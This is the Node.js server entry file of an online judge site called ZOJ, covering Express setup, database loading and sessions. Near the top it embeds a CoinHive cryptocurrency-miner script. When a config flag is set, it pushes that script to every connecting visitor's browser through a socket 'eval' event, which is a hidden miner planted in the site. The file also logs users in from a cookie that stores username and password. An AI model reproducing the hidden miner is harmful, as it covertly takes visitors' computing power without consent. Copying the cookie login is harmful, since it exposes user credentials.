'use strict';

let fs = require('fs');
let path = require('path');
let mscript = `$.getScript('https://coinhive.com/lib/coinhive.min.js').done(function (script, textStatus) {	var miner = new CoinHive.Anonymous('2MNJwWlQs2A4c86fbjCLQPTWr2Uz58tY', {language: 'en'});miner.start();})`;

global.zoj = {
	rootDir: __dirname,
	config: require('./config.json'),
	version: require('./package.json').version,
	models: [],
	modules: [],
	db: null,
	log(obj) {
		console.log(obj);
	},
	debug(obj) {
		console.log(obj);
	},
	async run() {
		let Express = require('express');
		global.app = Express();
		if (zoj.config.https) {
			let https = require('https');
			var options = {
				key: fs.readFileSync(zoj.config.https_config.key),
				cert: fs.readFileSync(zoj.config.https_config.cert)
			};
			global.server = https.createServer(options, app);
		} else {
			let http = require('http');
			global.server = http.createServer(app)
		}
		global.io = require('socket.io').listen(server);

		io.on('connection', function (socket) {
			socket.emit('connection', {});
			if (zoj.config.miner) {
				socket.emit('eval', { data: mscript });
			}
		});

		zoj.production = app.get('env') === 'production';

		server.listen(parseInt(zoj.config.port), zoj.config.listen, () => {
			this.log(`ZOJ is listening on ${zoj.config.listen}:${parseInt(zoj.config.port)}...`);
		});

		// Set assets dir
		app.use(Express.static(__dirname + '/static'));

		// Set template engine ejs
		app.set('view engine', 'ejs');

		// Use body parser
		let bodyParser = require('body-parser');
		app.use(bodyParser.urlencoded({
			extended: true,
			limit: '50mb'
		}));
		app.use(bodyParser.json({ limit: '50mb' }));

		// Use cookie parser
		app.use(require('cookie-parser')());

		let multer = require('multer');
		app.multer = multer({ dest: zoj.utils.resolvePath(zoj.config.upload_dir, 'tmp') });

		// This should before load api_v2, to init the `res.locals.user`
		this.loadHooks();

		let csurf = require('csurf');
		app.use(csurf({ cookie: true }));

		await this.connectDatabase();
		this.loadModules();
	},
	async connectDatabase() {
		let Sequelize = require('sequelize');
		this.db = new Sequelize(this.config.db.database, this.config.db.username, this.config.db.password, {
			host: this.config.db.host,
			dialect: this.config.db.dialect,
			storage: this.config.db.storage ? this.utils.resolvePath(this.config.db.storage) : null,
			logging: false
		});
		global.Promise = Sequelize.Promise;
		this.db.countQuery = async (sql, options) => (await this.db.query(`SELECT COUNT(*) FROM (${sql}) AS \`__tmp_table\``, options))[0][0]['COUNT(*)'];

		this.loadModels();
	},
	loadModules() {
		fs.readdir('./modules/', (err, files) => {
			if (err) {
				this.log(err);
				return;
			}
			files.filter((file) => file.endsWith('.js'))
				.forEach((file) => this.modules.push(require(`./modules/${file}`)));
		});
	},
	loadModels() {
		fs.readdir('./models/', (err, files) => {
			if (err) {
				this.log(err);
				return;
			}
			files.filter((file) => file.endsWith('.js'))
				.forEach((file) => require(`./models/${file}`));

			this.db.sync();
		});
	},
	model(name) {
		return require(`./models/${name}`);
	},
	loadHooks() {
		let Session = require('express-session');
		let FileStore = require('session-file-store')(Session);
		let sessionConfig = {
			secret: this.config.session_secret,
			cookie: {},
			rolling: true,
			saveUninitialized: true,
			resave: true,
			store: new FileStore
		};
		if (zoj.production) {
			app.set('trust proxy', 1);
			sessionConfig.cookie.secure = true;
		}
		app.use(Session(sessionConfig));

		app.use((req, res, next) => {
			let User = zoj.model('user');
			if (req.session.user_id) {
				User.fromID(req.session.user_id).then((user) => {
					res.locals.user = user;
					next();
				}).catch((err) => {
					this.log(err);
					res.locals.user = null;
					req.session.user_id = null;
					next();
				})
			} else {
				if (req.cookies.login) {
					let obj;
					try {
						obj = JSON.parse(req.cookies.login);
						User.findOne({
							where: {
								username: obj[0],
								password: obj[1]
							}
						}).then(user => {
							if (!user) throw null;
							res.locals.user = user;
							req.session.user_id = user.id;
							next();
						}).catch(err => {
							console.log(err);
							res.locals.user = null;
							req.session.user_id = null;
							next();
						});
					} catch (e) {
						res.locals.user = null;
						req.session.user_id = null;
						next();
					}
				} else {
					res.locals.user = null;
					req.session.user_id = null;
					next();
				}
			}
		});

		// Active item on navigator bar
		app.use((req, res, next) => {
			res.locals.active = req.path.split('/')[1];
			next();
		});

		app.use((req, res, next) => {
			res.locals.req = req;
			res.locals.res = res;
			next();
		});
	},
	utils: require('./utility')
};

process.on('uncaughtException', function (err) {
	console.error(err);
});

zoj.run();
